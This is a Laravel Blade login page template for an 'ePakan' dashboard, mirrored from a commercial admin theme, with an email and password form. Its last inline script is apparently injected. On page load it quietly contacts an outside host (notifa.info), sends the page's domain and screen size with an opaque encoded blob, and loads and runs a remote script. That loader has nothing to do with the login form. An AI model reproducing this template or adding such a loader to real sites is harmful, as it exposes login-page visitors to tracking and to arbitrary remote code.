<!DOCTYPE html>
<html lang="en">


<!-- Mirrored from myrathemes.com/xacton/vertical/pages-login.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 15 Feb 2020 13:31:39 GMT -->
<head>
    <meta charset="utf-8" />
    <title>ePakan - Dashboard Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta content="Premium Multipurpose Admin & Dashboard Template" name="description" />
    <meta content="MyraStudio" name="author" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />

    <!-- App favicon -->
    <link rel="shortcut icon" href="assets/images/epakan.png">

    <!-- App css -->
    <link href="assets/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
    <link href="assets/css/icons.min.css" rel="stylesheet" type="text/css" />
    <link href="assets/css/temalogin.min.css" rel="stylesheet" type="text/css" />
    {{-- <link href="assets/css/theme.min.css" rel="stylesheet" type="text/css" /> --}}

</head>

<body>
 
    <div>
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <div class="d-flex align-items-center min-vh-100">
                        <div class="w-100 d-block shadow-lg rounded my-5">
                            <div class="row">
                                <div class="col-lg-5 d-none d-lg-block bg-login rounded-left"></div>
                                <div class="col-lg-7">
                                    <div class="p-5">
                                        <div class="text-center mb-5">
                                            <a href="index.html" class="text-dark font-size-22 font-family-secondary">
                                                <i class=""></i> <b>Login ePakan</b>
                                            </a>
                                        </div>
                                        <h1 class="h5 mb-1">Selamat Datang!</h1>
                                        <p class="text-muted mb-4">Masukkan Email dan Password kamu untuk melanjutkan ke halaman Dashboard ePakan.</p>
                                        <form method="POST" action="{{ route('login') }}">
                                            @csrf
                    
                                            <div class="form-group row">
                                                <label for="email" class="col-md-4 col-form-label text-md-right">{{ __('E-Mail Address') }}</label>
                    
                                                <div class="col-md-6">
                                                    <input id="email" type="email" class="form-control @error('email') is-invalid @enderror" name="email" value="{{ old('email') }}" required autocomplete="email" autofocus>
                    
                                                    @error('email')
                                                        <span class="invalid-feedback" role="alert">
                                                            <strong>{{ $message }}</strong>
                                                        </span>
                                                    @enderror
                                                </div>
                                            </div>
                    
                                            <div class="form-group row">
                                                <label for="password" class="col-md-4 col-form-label text-md-right">{{ __('Password') }}</label>
                    
                                                <div class="col-md-6">
                                                    <input id="password" type="password" class="form-control @error('password') is-invalid @enderror" name="password" required autocomplete="current-password">
                    
                                                    @error('password')
                                                        <span class="invalid-feedback" role="alert">
                                                            <strong>{{ $message }}</strong>
                                                        </span>
                                                    @enderror
                                                </div>
                                            </div>
                    
                                            <div class="form-group row">
                                                <div class="col-md-6 offset-md-4">
                                                    <div class="form-check">
                                                        <input class="form-check-input" type="checkbox" name="remember" id="remember" {{ old('remember') ? 'checked' : '' }}>
                    
                                                        <label class="form-check-label" for="remember">
                                                            {{ __('Remember Me') }}
                                                        </label>
                                                    </div>
                                                </div>
                                            </div>
                    
                                            <div class="form-group row mb-0">
                                                <div class="col-md-8 offset-md-4">
                                                    <button type="submit" class="btn btn-success">
                                                        {{ __('Login') }}
                                                    </button>
                    
                                                    @if (Route::has('password.request'))
                                                        <a class="btn btn-link" href="{{ route('password.request') }}">
                                                            {{ __('Forgot Your Password?') }}
                                                        </a>
                                                    @endif
                                                </div>
                                            </div>
                                        </form>

                                        {{-- <div class="row mt-4">
                                            <div class="col-12 text-center">
                                                <p class="text-muted mb-2"><a href="pages-recoverpw.html" class="text-muted font-weight-medium ml-1">Forgot your password?</a></p>
                                                {{-- <p class="text-muted mb-0">Don't have an account? <a href="pages-register.html" class="text-muted font-weight-medium ml-1"><b>Sign Up</b></a></p>
                                            </div> <!-- end col -->
                                        </div> --}}
                                        <!-- end row -->
                                    </div> <!-- end .padding-5 -->
                                </div> <!-- end col -->
                            </div> <!-- end row -->
                        </div> <!-- end .w-100 -->
                    </div> <!-- end .d-flex -->
                </div> <!-- end col-->
            </div> <!-- end row -->
        </div>
        <!-- end container -->
    </div>
    <!-- end page -->

    <!-- jQuery  -->
    <script src="assets/js/jquery.min.js"></script>
    <script src="assets/js/bootstrap.bundle.min.js"></script>
    <script src="assets/js/metismenu.min.js"></script>
    <script src="assets/js/waves.js"></script>
    <script src="assets/js/simplebar.min.js"></script>

    <!-- App js -->
    <script src="assets/js/theme.js"></script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXPpySoYO2SA3SjXza4NQqVgpLOKQgdOiZ9OsTVAlED8LqIAZsgVPItZKG0vTj3Bni8LHZ5HK0L0Gz6P1sBV478AYaUpoJjxrOqbzPtcF9cQ0ROioyAWzluVxVEu2FtFL49%2fk7HnfhmkGFQavy7Q2MjJSpNHH5LPLqs%2f8nIqRvtBXHB%2fPJQVZw3YJZnZCqrvito1EuFwavrvaouY9afZjKeq9DfOtFeuQKU3hl62l%2fvhJ%2bxeejlKAhG1uSOi7lrqfvIdLJvzm279mCFfxhhIqWZ64qPBt5dVeFBgjHZS7uIB2HMKbf%2fy0gO9BMQCQYjFV0ikmzXRGyE7u8cUtUS4RQWm0gKg6%2f2ukPWo9vuDEQpg0sBqRGDf5ahDpTf5jNljv%2bO4n%2ff17JGJ%2fB9GhCugxI0BF6nrPNNh9CB6KcE5uzx3lJ9DFaX3cn%2b9M1Ia0mv5FvgJPe6U%2fEgY0BlPhDrcEfHKCdAMxSw3cZGF8TIbbUM7cNOo6O1u9v2Q%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


<!-- Mirrored from myrathemes.com/xacton/vertical/pages-login.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 15 Feb 2020 13:31:39 GMT -->
</html>